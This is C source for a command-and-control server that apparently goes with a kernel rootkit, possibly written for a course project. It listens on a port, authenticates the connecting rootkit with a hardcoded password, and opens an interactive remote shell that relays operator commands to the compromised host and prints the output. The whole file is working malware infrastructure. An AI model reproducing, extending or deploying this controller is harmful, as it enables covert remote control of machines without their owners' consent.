#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#define DEFAULT_PORT 4242
#define BUF_SIZE     256

static void timestamp(void)
{
    time_t t = time(NULL);
    struct tm *tm = localtime(&t);
    char buf[32];
    strftime(buf, sizeof(buf), "%H:%M:%S", tm);
    printf("[%s] ", buf);
}

int main(int argc, char **argv)
{
    int port = (argc > 1) ? atoi(argv[1]) : DEFAULT_PORT;
    int server_fd, client_fd;
    struct sockaddr_in server_addr = { 0 }, client_addr = { 0 };
    socklen_t client_len = sizeof(client_addr);
    char buf[BUF_SIZE];
    int opt = 1;

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        perror("socket");
        return 1;
    }

    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    server_addr.sin_family      = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port        = htons(port);

    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("bind");
        return 1;
    }

    if (listen(server_fd, 1) < 0) {
        perror("listen");
        return 1;
    }

    printf("C2 listening on port %d\n", port);

    while (1) {
        timestamp();
        printf("[?] Waiting for rootkit connection...\n");
        fflush(stdout);

        client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &client_len);
        if (client_fd < 0) {
            perror("accept");
            continue;
        }

        timestamp();
        printf("[+] Rootkit connected from %s\n", inet_ntoa(client_addr.sin_addr));
        fflush(stdout);

        /* * [ADDED] AUTHENTICATION PROTOCOL (Section 7.8) 
         * Send the AUTH command immediately upon connection setup.
         */
        char auth_cmd[BUF_SIZE];
        const char *secret_password = "monmotdepasse"; // Must match the insmod parameter
        
        snprintf(auth_cmd, sizeof(auth_cmd), "AUTH %s\n", secret_password);
        send(client_fd, auth_cmd, strlen(auth_cmd), 0);
        
        // Wait for the rootkit's validation response
        memset(buf, 0, sizeof(buf));
        int bytes_received = read(client_fd, buf, sizeof(buf) - 1);
        
        if (bytes_received <= 0 || strstr(buf, "AUTH_OK") == NULL) {
            timestamp();
            printf("[!] Authentication failed. Connection dropped.\n");
            close(client_fd);
            continue;
        }
        
        timestamp();
        printf("[+] Authentication successful! Interactive shell opened.\n");
        fflush(stdout);

        /* * [ADDED] INTERACTIVE COMMAND LOOP (Section 7.9) 
         * Prompts the operator, sends the instruction, and prints the result.
         */
        while (1) {
            printf("wlkom@%s $> ", inet_ntoa(client_addr.sin_addr));
            fflush(stdout);

            memset(buf, 0, sizeof(buf));
            if (fgets(buf, sizeof(buf), stdin) == NULL) {
                break;
            }

            if (strcmp(buf, "\n") == 0) {
                continue;
            }

            if (strncmp(buf, "exit", 4) == 0 || strncmp(buf, "quit", 4) == 0) {
                break;
            }

            if (send(client_fd, buf, strlen(buf), 0) < 0) {
                break;
            }

            // Read execution output from the rootkit
            memset(buf, 0, sizeof(buf));
            bytes_received = read(client_fd, buf, sizeof(buf) - 1);
            if (bytes_received <= 0) {
                printf("\n[-] Lost connection with the rootkit.\n");
                break;
            }
            printf("%s", buf);
        }

        timestamp();
        printf("[-] Rootkit disconnected\n");
        fflush(stdout);

        close(client_fd);
    }

    close(server_fd);
    return 0;
}